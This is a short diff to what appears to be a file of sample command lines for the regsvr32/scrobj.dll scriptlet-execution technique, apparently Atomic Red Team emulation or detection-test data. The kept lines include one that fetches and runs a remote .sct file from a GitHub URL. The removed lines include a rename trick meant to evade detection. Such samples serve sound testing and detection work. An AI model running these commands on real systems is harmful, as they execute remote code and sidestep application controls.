@@ -1,5 +1,2 @@
-C:\Windows\system32\regsvr32.exe  /s /u /i:"C:\AtomicRedTeam\atomics\T1218.010\src\RegSvr32.sct" scrobj.dll
-C:\Windows\system32\regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll
-copy regsvr32.exe rundll64.exe && rundll64.exe /i:payload.sct scrobj.dll
-regsvr32.exe /s /n /u /i:payload.sct scrobj.dll
-regsvr32.exe/i:payload.sct scrobj.dll
+C:\Windows\system32\regsvr32.exe /s /u /i:"C:\AtomicRedTeam\atomics\T1218.010\src\RegSvr32.sct" scrobj.dll
+C:\Windows\system32\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll
